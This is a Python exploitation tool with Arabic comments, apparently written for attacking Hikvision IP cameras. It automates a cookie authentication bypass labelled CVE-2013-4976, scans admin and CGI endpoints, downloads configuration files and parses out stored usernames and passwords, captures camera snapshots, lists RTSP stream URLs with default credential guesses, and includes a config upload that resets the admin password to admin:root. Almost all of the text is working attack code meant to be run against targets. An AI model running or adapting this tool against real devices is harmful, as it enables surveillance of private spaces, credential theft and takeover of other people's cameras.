#!/usr/bin/env python3
"""
HikCam-Hijack v1.0
اختراق كاميرات Hikvision IP - بدون كلمة سر (Zero Bruteforce)
التقنيات: Cookie Bypass (CVE-2013-4976) + Direct Endpoint Access + Config Injection
Author: HackerAI Penetration Testing Suite
"""

import requests
import base64
import urllib3
import sys
import os
import argparse
import json
from datetime import datetime
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIG
# ============================================================
BANNER = """
╔══════════════════════════════════════════════╗
║           HikCam-Hijack v1.0                ║
║    Hikvision IP Camera Exploitation Tool      ║
║        Zero Bruteforce - Cookie Bypass        ║
╚══════════════════════════════════════════════╝
"""

# Base64: "anonymous:\177\177\177\177\177\177"
HIK_COOKIE = base64.b64encode(b'anonymous:\\177\\177\\177\\177\\177\\177').decode()

SENSITIVE_ENDPOINTS = [
    "/doc/page/main.asp",
    "/doc/page/deviceInfo.asp",
    "/doc/page/config.asp",
    "/doc/page/network.asp",
    "/doc/page/security.asp",
    "/doc/page/userManager.asp",
    "/doc/page/remoteConfig.asp",
    "/doc/page/storage.asp",
    "/doc/page/imageParam.asp",
    "/doc/page/videoParam.asp",
    "/doc/page/recordSchedule.asp",
    "/doc/page/alarmConfig.asp",
    "/doc/page/PTZConfig.asp",
    "/doc/page/Log.asp",
    "/doc/page/eventManager.asp",
    "/doc/page/systemConfig.asp",
    "/doc/page/timeConfig.asp",
]

SENSITIVE_CGIS = [
    "/cgi-bin/ConfigDownload",
    "/cgi-bin/ConfigUpload",
    "/cgi-bin/Snapshot/JPEG?Resolution=640x480&Quality=High",
    "/cgi-bin/Streaming/channels/1/picture",
    "/PSIA/Streaming/channels/1/picture",
    "/onvif-http/snapshot?Profile_1",
    "/cgi-bin/System/deviceInfo",
    "/cgi-bin/System/time",
    "/cgi-bin/User/List",
    "/cgi-bin/User/Check",
    "/cgi-bin/Event/Notification/alertStream",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}


# ============================================================
# CORE FUNCTIONS
# ============================================================

def log(msg, status="+"):
    """طباعة رسالة منسقة"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    color = {"+": "\033[92m", "-": "\033[91m", "*": "\033[94m", "!": "\033[93m"}
    reset = "\033[0m"
    sym = color.get(status, "\033[94m")
    print(f"{sym}[{status}]{reset} [{timestamp}] {msg}")


def make_request(url, method="GET", data=None, timeout=10):
    """تنفيذ طلب HTTP"""
    try:
        if method.upper() == "GET":
            r = requests.get(url, headers=HEADERS, timeout=timeout, verify=False)
        else:
            r = requests.post(url, headers=HEADERS, data=data, timeout=timeout, verify=False)
        return r
    except Exception as e:
        log(f"Request failed: {e}", "-")
        return None


def check_live(target):
    """فحص إذا الكاميرا حية"""
    url = f"http://{target}"
    r = make_request(url)
    if r and r.status_code < 500:
        log(f"Target is ALIVE — HTTP {r.status_code}", "+")
        if "login" in r.text.lower() or "doc/page/login" in r.text:
            log("Login page detected — Hikvision device confirmed", "*")
        return True
    log("Target unreachable", "-")
    return False


def cookie_bypass(target, port=80):
    """
    CVE-2013-4976: تجاوز المصادقة عبر كوكي anonymous
    """
    log("Attempting Cookie Bypass (CVE-2013-4976)...", "*")

    cookie_name = f"userInfo{port}"
    cookies = {cookie_name: HIK_COOKIE}

    # جرب الدخول مباشرة للوحة التحكم
    url = f"http://{target}/doc/page/main.asp"
    r = requests.get(url, headers=HEADERS, cookies=cookies, timeout=10, verify=False)

    if r and r.status_code == 200 and len(r.text) > 500:
        log(f"COOKIE BYPASS SUCCESSFUL! — HTTP {r.status_code}, {len(r.text)} bytes", "+")
        if "top.asp" in r.text or "menu" in r.text.lower():
            log("Full admin panel access GRANTED via cookie bypass!", "+")
        return True, cookies
    else:
        log(f"Cookie bypass failed — HTTP {r.status_code if r else 'N/A'}", "-")
        return False, None


def direct_endpoint_access(target, cookies=None):
    """
    الوصول المباشر للصفحات الحساسة بدون مصادقة
    """
    log("Scanning for unprotected endpoints...", "*")
    found = []

    for endpoint in SENSITIVE_ENDPOINTS:
        url = f"http://{target}{endpoint}"
        r = requests.get(url, headers=HEADERS, cookies=cookies if cookies else {},
                         timeout=8, verify=False)

        if r and r.status_code == 200 and len(r.text) > 300:
            found.append((endpoint, r.status_code, len(r.text)))
            log(f"ACCESSIBLE: {endpoint} ({len(r.text)} bytes)", "+")

    for endpoint in SENSITIVE_CGIS:
        url = f"http://{target}{endpoint}"
        r = requests.get(url, headers=HEADERS, cookies=cookies if cookies else {},
                         timeout=8, verify=False)

        if r and r.status_code == 200 and len(r.text) > 20:
            found.append((endpoint, r.status_code, len(r.text)))
            log(f"ACCESSIBLE CGI: {endpoint} ({len(r.text)} bytes)", "+")

    if not found:
        log("No directly accessible endpoints found via anonymous access", "!")

    return found


def download_config(target, cookies=None):
    """
    تحميل ملف إعدادات الكاميرا (يحتوي كل كلمات السر)
    """
    log("Attempting config download...", "*")

    # المحاولات المختلفة
    urls = [
        f"http://{target}/cgi-bin/ConfigDownload",
        f"http://{target}/doc/page/configData.asp?action=export",
        f"http://{target}/Config/backup.bin",
    ]

    for url in urls:
        r = requests.get(url, headers=HEADERS, cookies=cookies if cookies else {},
                         timeout=10, verify=False)

        if r and r.status_code == 200 and len(r.text) > 1000:
            filename = f"hikvision_config_{target.replace('.','_')}.xml"
            with open(filename, "wb") as f:
                f.write(r.content)
            log(f"Config DOWNLOADED → {filename} ({len(r.content)} bytes)", "+")

            # استخراج creds من الملف
            extract_creds_from_config(r.text)
            return filename

    log("Config download failed — endpoints protected or not available", "-")
    return None


def extract_creds_from_config(config_text):
    """استخراج creds من ملف الإعدادات"""
    import re

    # البحث عن user credentials
    user_patterns = [
        r'<userName>(.*?)</userName>',
        r'<password>(.*?)</password>',
        r'<safePassword>(.*?)</safePassword>',
        r'<id>(\d+)</id>',
        r'<userLevel>(.*?)</userLevel>',
        r'UserList.*?admin',
    ]

    log("Parsing config for credentials...", "*")

    usernames = re.findall(r'<userName>([^<]+)</userName>', config_text)
    passwords = re.findall(r'<password>([^<]+)</password>', config_text)
    levels = re.findall(r'<userLevel>([^<]+)</userLevel>', config_text)

    for i, user in enumerate(usernames):
        pw = passwords[i] if i < len(passwords) else "N/A"
        lvl = levels[i] if i < len(levels) else "N/A"
        log(f"User: {user} | Pass: {pw} | Level: {lvl}", "+")


def grab_snapshot(target, cookies=None):
    """
    سحب لقطة مباشة من الكاميرا
    """
    log("Attempting snapshot grab...", "*")

    snapshot_urls = [
        f"http://{target}/cgi-bin/Snapshot/JPEG?Resolution=640x480&Quality=High",
        f"http://{target}/cgi-bin/Streaming/channels/1/picture",
        f"http://{target}/PSIA/Streaming/channels/1/picture",
        f"http://{target}/onvif-http/snapshot?Profile_1",
    ]

    for url in snapshot_urls:
        r = requests.get(url, headers=HEADERS, cookies=cookies if cookies else {},
                         timeout=10, verify=False)

        if r and r.status_code == 200 and len(r.content) > 5000:
            # التحقق من أنه JPEG
            if r.content[:2] == b'\xff\xd8':
                filename = f"snapshot_{target.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(filename, "wb") as f:
                    f.write(r.content)
                log(f"SNAPSHOT CAPTURED → {filename} ({len(r.content)} bytes)", "+")
                return filename

    log("No snapshot endpoint available", "-")
    return None


def config_injection_attack(target):
    """
    رفع ملف config لتغيير creds الـ admin
    """
    log("Attempting config injection (upload overwrite)...", "*")

    # إنشاء XML payload — يغير creds أول مستخدم
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<Config version="1.0">
<DeviceInfo>
    <userName>admin</userName>
    <userPassword>root</userPassword>
</DeviceInfo>
<UserList>
    <User>
        <id>1</id>
        <userName>admin</userName>
        <password>root</password>
        <userLevel>administrator</userLevel>
    </User>
</UserList>
</Config>"""

    # المحاولة المباشرة للرفع
    url = f"http://{target}/cgi-bin/ConfigUpload"
    files = {'config': ('config.xml', payload, 'application/xml')}

    r = requests.post(url, headers=HEADERS, files=files, timeout=10, verify=False)

    if r and r.status_code == 200:
        log("Config UPLOADED successfully — credentials CHANGED to admin:root", "+")
        log("Try logging in: http://{} with admin:root".format(target), "!")
        return True

    log("Config injection failed — endpoint protected", "-")
    return False


def check_rtsp(target):
    """
    فتح بث RTSP المباشر
    """
    log("Checking RTSP streams...", "*")

    rtsp_paths = [
        "/h264/ch1/main/av_stream",
        "/h264/ch1/sub/av_stream",
        "/h264/ch2/main/av_stream",
        "/h264/ch3/main/av_stream",
        "/h264/ch4/main/av_stream",
        "/mpeg4/ch1/main/av_stream",
        "/mpeg4/ch1/sub/av_stream",
        "/live/ch1",
        "/live/ch0",
        "/av0_0",
        "/av0_1",
        "/1",
        "/11",
        "/12",
        "/13",
        "/14",
    ]

    creds_list = ["admin:admin", "admin:12345", "admin:root", "admin:password",
                  "admin:1234", "888888:888888", "admin:"]

    for path in rtsp_paths:
        for cred in creds_list:
            rtsp_url = f"rtsp://{cred}@{target}:554{path}"
            print(f"  Try: {rtsp_url}")

    log(f"Test RTSP with: rtsp://admin:12345@{target}:554/h264/ch1/main/av_stream", "!")
    log(f"Open in VLC: rtsp://admin:12345@{target}:554/h264/ch1/main/av_stream", "!")


def auto_pwn(target, port=80):
    """الهجوم الكامل أوتوماتيكياً"""
    print(BANNER)
    log(f"Target: {target}:{port}", "*")
    log("=" * 50, "*")

    # 1. فحص الحياة
    if not check_live(target):
        return

    print()

    # 2. Cookie Bypass
    bypass_success, cookies = cookie_bypass(target, port)

    effective_cookies = cookies if bypass_success else None

    print()

    # 3. المسح على الاندبوينتس المكشوفة
    direct_endpoint_access(target, effective_cookies)

    print()

    # 4. سحب الإعدادات + creds
    config_file = download_config(target, effective_cookies)

    print()

    # 5. سحب لقطة
    snapshot = grab_snapshot(target, effective_cookies)

    print()

    # 6. فحص RTSP
    if bypass_success:
        check_rtsp(target)

    print()

    # 7. Config Injection (اختياري - خطير)
    # config_injection_attack(target)

    # 8. التقرير النهائي
    print()
    log("=" * 50, "*")
    if bypass_success or config_file or snapshot:
        log("EXPLOITATION RESULTS:", "+")
        if bypass_success:
            log(f"  ✅ Cookie Bypass: SUCCESS — Admin panel accessed!", "+")
        if config_file:
            log(f"  ✅ Config Dump:    {config_file}", "+")
        if snapshot:
            log(f"  ✅ Snapshot:       {snapshot}", "+")
        log("\n  🎥 RTSP Commands:", "+")
        log(f"     rtsp://admin:12345@{target}:554/h264/ch1/main/av_stream", "+")
    else:
        log("EXPLOITATION FAILED — All techniques exhausted", "-")


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HikCam-Hijack - Hikvision IP Camera Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 hijack.py 192.168.151.157              # Auto pwn with default port
  python3 hijack.py 192.168.151.157 -p 8080       # Custom HTTP port
  python3 hijack.py 192.168.151.157 --snapshot     # Grab snapshot only
  python3 hijack.py 192.168.151.157 --config       # Download config only
  python3 hijack.py 192.168.151.157 --bypass       # Cookie bypass only
  python3 hijack.py 192.168.151.157 --inject       # Change admin password to admin:root
        """
    )
    parser.add_argument("target", help="Target IP address (e.g., 192.168.151.157)")
    parser.add_argument("-p", "--port", type=int, default=80, help="HTTP port (default: 80)")
    parser.add_argument("--snapshot", action="store_true", help="Grab snapshot only")
    parser.add_argument("--config", action="store_true", help="Download config only")
    parser.add_argument("--bypass", action="store_true", help="Cookie bypass only")
    parser.add_argument("--inject", action="store_true", help="Config injection (DANGEROUS - changes admin password to root)")
    parser.add_argument("--rtsp", action="store_true", help="Check RTSP streams only")

    args = parser.parse_args()

    if args.snapshot:
        grab_snapshot(args.target)
    elif args.config:
        download_config(args.target)
    elif args.bypass:
        cookie_bypass(args.target, args.port)
    elif args.inject:
        config_injection_attack(args.target)
    elif args.rtsp:
        check_rtsp(args.target)
    else:
        auto_pwn(args.target, args.port)
